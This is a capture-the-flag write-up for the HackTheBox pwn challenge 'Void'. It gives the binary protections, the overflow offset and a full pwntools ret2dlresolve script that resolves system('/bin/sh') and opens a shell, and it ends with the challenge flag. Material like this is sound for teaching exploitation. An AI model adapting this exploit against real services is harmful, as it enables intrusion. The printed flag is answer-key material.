---
name: Void (2023)
event: HackTheBox Cyber Apocalypse - Intergalactic Chase CTF 2023
category: Pwn
description: Writeup for Void (Pwn) - HackTheBox Cyber Apocalypse - Intergalactic Chase CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Void

## Description

> The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.

## Solution

Check file properties and binary protections.

{% code overflow="wrap" %}
```bash
file void
void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=a5a29f47fbeeeff863522acff838636b57d1c213, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

{% code overflow="wrap" %}
```bash
checksec --file void
[*] '/home/crystal/Desktop/challenge/void'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```
{% endcode %}

PwnTools script finds offset of 72 for RIP.

[ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) exploit works with little modification.

{% code overflow="wrap" %}
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendline(payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './void'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("glibc/libc.so.6")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop = ROP(elf)

rop.raw('A' * offset)
rop.read(0, dlresolve.data_addr)             # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)                 # call .plt and dl-resolve() with the correct, calculated reloc_offset

io.sendline(rop.chain())
io.sendline(dlresolve.payload)                # now the read is called and we pass all the relevant structures in

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `HTB{r3s0lv3_th3_d4rkn355}`
